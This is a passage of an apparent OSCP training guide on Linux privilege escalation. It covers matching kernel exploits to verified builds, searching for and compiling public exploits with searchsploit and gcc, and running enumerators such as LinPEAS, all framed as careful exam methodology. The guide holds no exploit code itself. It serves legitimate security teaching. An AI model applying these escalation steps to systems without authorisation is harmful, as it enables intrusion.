+<p>Observation: a loopback database is inaccessible externally. Test: identify its credentials and access it locally or through a justified forward. Illustrative output: data reads succeed as a limited DB user. Interpretation: follow the database's actual rights.</p>
+<h3 id="8-verify-the-result-13">8. Verify the result</h3>
+<p>Verify the actual file/service operation, mapped identity and any resulting execution effect.</p>
+<h3 id="9-failure-and-fallback-13">9. Failure and fallback</h3>
+<p>An exposed export or listener is only a candidate. Validate mapping, authentication and consumer before claiming escalation.</p>
+<h3 id="10-next-transitions-13">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/services/#service-nfs">Inspect RPC/NFS exports and effective file identity</a>; <a href="/oscp/notes/methods/services/#service-mysql">Use MySQL/MariaDB data and file primitives</a>; <a href="/oscp/notes/methods/pivoting/#ssh-local">Forward a selected service through an SSH client-side listener</a>.</p>
+<p><a id="linux-kernel"></a></p>
+<h2 id="select-an-evidence-matched-linux-software-or-kernel-exploit">Select an evidence-matched Linux software or kernel exploit</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#13-softwarekernel-exploits-evidence-last">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-14">1. Purpose and result</h3>
+<p>A justified local exploit test and independently verified privilege result.</p>
+<h3 id="2-recognition-clues-14">2. Recognition clues</h3>
+<p>Permission/credential paths are insufficient and an exact affected build/configuration is present.</p>
+<h4 id="find-the-clue-from-your-starting-access-14">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Collect distribution build/package/architecture and the required local feature before comparing a specific advisory/PoC.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">uname -a
+cat /etc/os-release
+getconf LONG_BIT
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Kernel release: KERNEL_RELEASE
+Distribution package/build: VENDOR_BUILD
+Required vulnerable feature: not yet verified
+</code></pre>
+<p><strong>Recognize this detail:</strong> A version-associated advisory is a candidate; backports and feature state determine applicability.</p>
+<p><strong>Still missing before method selection:</strong> Collect uname and the distribution's package/build plus architecture. Match the advisory's vulnerable feature and vendor patch status before choosing a PoC; try a confirmed sudo/file/credential route first when one exists.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Affected code/configuration and compatible reviewed PoC are established: select its bounded test.</td></tr><tr><td>Ruled out in this context</td><td>The vendor build includes the fix or required feature is absent: reject that exploit.</td></tr><tr><td>Inconclusive</td><td>A release string without patch/configuration evidence leaves vulnerability unconfirmed.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-14">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Vulnerable package/kernel state, architecture, mitigations, namespaces and documented exploit-specific conditions.</p>
+<h3 id="4-discover-and-verify-prerequisites-14">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">uname -a
+cat /etc/os-release
+getconf LONG_BIT
+</code></pre>
+<h3 id="5-why-it-works-14">5. Why it works</h3>
+<p>Kernel release strings can hide patched distributions. A matching CVE needs affected code/configuration and compatible exploit assumptions; a crash is neither success nor proof that another build will work.</p>
+<h3 id="6-execute-and-choose-variants-14">6. Execute and choose variants</h3>
+<pre><code class="language-bash">uname -a
+cat /proc/version
+cat /etc/os-release
+dpkg -l 2>/dev/null
+rpm -qa 2>/dev/null
+sudo --version
+lsmod
+sysctl kernel.unprivileged_userns_clone 2>/dev/null
+</code></pre>
+<pre><code class="language-bash">searchsploit "PRODUCT VERSION local privilege escalation"
+searchsploit -x EDB_ID
+searchsploit -m EDB_ID
+gcc -Wall -Wextra exploit.c -o exploit
+file exploit
+sha256sum exploit
+</code></pre>
+<blockquote>
+<p>Match component, exact distribution/build and patch/backport state, architecture, required configuration/capabilities/namespaces, mitigations and dependencies. Review source and recovery risk. A version title or successful compilation is only a candidate. Follow <a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">public exploit adaptation</a>.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-14">7. Worked example — hypothetical</h3>
+<p>Observation: an automated tool names a kernel CVE. Test: compare the distribution patch/build and required feature. Illustrative output: the vendor build includes the fix. Interpretation: reject the candidate and return to unexamined permissions/applications.</p>
+<h3 id="8-verify-the-result-14">8. Verify the result</h3>
+<p>Verify actual effective UID/host context after the exploit, keeping the reviewed source and adaptation record.</p>
+<h3 id="9-failure-and-fallback-14">9. Failure and fallback</h3>
+<p>Wrong build, missing feature or mitigation can invalidate the PoC. Choose another evidence-backed candidate rather than cycling random local exploits.</p>
+<h3 id="10-next-transitions-14">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/public-exploits/#exploit-select">Match a public exploit to the actual component and configuration</a>; <a href="/oscp/notes/methods/public-exploits/#exploit-compile">Compile and minimally adapt an existing native or memory-corruption PoC</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<p><a id="linux-enumerators"></a></p>
+<h2 id="use-enumeration-tools-to-generate-manually-testable-candidates">Use enumeration tools to generate manually testable candidates</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#14-automated-enumeration-generate-then-prove">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-15">1. Purpose and result</h3>
+<p>Candidate permissions, credentials and consumers for manual validation.</p>
+<h3 id="2-recognition-clues-15">2. Recognition clues</h3>
+<p>A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths.</p>
+<h4 id="find-the-clue-from-your-starting-access-15">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Use known manual gaps and the host/runtime context to choose a reviewed enumerator; inspect each highlighted finding against native evidence.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">id
+uname -m
+command -v bash python3
+ls -ld /tmp
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Enumerator candidate: writable /opt/APP/script.sh
+Consumer identity: unknown
+Trigger: unknown
+</code></pre>
+<p><strong>Recognize this detail:</strong> The highlight supplies a candidate object, not the missing privileged consumer or execution trigger.</p>
+<p><strong>Still missing before method selection:</strong> Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The full manual chain validates: follow its owning method.</td></tr><tr><td>Ruled out in this context</td><td>Only a low-privileged process consumes the object: reject the escalation hypothesis.</td></tr><tr><td>Inconclusive</td><td>Missing tools or restricted /proc can hide evidence; investigate application-specific paths manually.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-15">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location.</p>
+<h3 id="4-discover-and-verify-prerequisites-15">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">id
+uname -m
+command -v bash python3
+ls -ld /tmp
+</code></pre>
+<h3 id="5-why-it-works-15">5. Why it works</h3>
+<p>Enumerators aggregate observations and heuristics. A highlighted path does not prove effective ACLs, privileged consumption, trigger or successful exploitation.</p>
+<h3 id="6-execute-and-choose-variants-15">6. Execute and choose variants</h3>
+<p>For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit:</p>
+<pre><code class="language-bash">sh ./linpeas.sh | tee linpeas.txt
+</code></pre>
+<p>Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline.</p>
+<pre><code class="language-bash">./linpeas.sh | tee linpeas.txt
+./lse.sh | tee lse.txt
+./lse.sh -l1 | tee lse-l1.txt
+./unix-privesc-check standard > unix-privesc-check.txt
+</code></pre>
+<blockquote>
+<p>LinPEAS optional flags vary by build. Read the local <code>./linpeas.sh -h</code> before selecting broader checks; they are not the automatic baseline. LSE progresses from default to <code>-l1</code>, then <code>-l2</code> only if needed. <code>unix-privesc-check detailed</code> is slower and more false-positive-prone.</p>
+</blockquote>
+<p>For every highlight:</p>
+<pre><code class="language-text">exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification
+</code></pre>
+<p>Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate.</p>
+<h3 id="7-worked-example--hypothetical-15">7. Worked example — hypothetical</h3>
+<p>Observation: LinPEAS highlights a writable path. Test: inspect its exact ACL, parent rights and consumer. Illustrative output: only an unprivileged process uses it. Interpretation: reject the escalation hypothesis while retaining the writable-path fact.</p>
+<h3 id="8-verify-the-result-15">8. Verify the result</h3>
+<p>Read linpeas.txt. Confirm a reported sudo rule with sudo -l, a privileged path with namei/stat/getfacl, or a scheduled consumer with pspy before using that finding</p>
+<h3 id="9-failure-and-fallback-15">9. Failure and fallback</h3>
+<p>Script blocked or output empty: check the shell, transfer integrity and output path, then use the native checks for the observed rule/file/job. Empty collector output does not rule out escalation</p>
+<h3 id="10-next-transitions-15">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>.</p>
+<h2 id="sources-and-shared-concepts">Sources and shared concepts</h2>
+<p>Supplied PEN-200 Ch 18 pp550–582. <a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/linux">Hexdump Linux modules</a> cover permissions, sudo/SUID, PATH, wildcards, capabilities and cron. <a href="https://gtfobins.github.io/">GTFOBins</a> supplies binary-specific modes after prerequisite validation.</p>
+<p>Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.</p></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
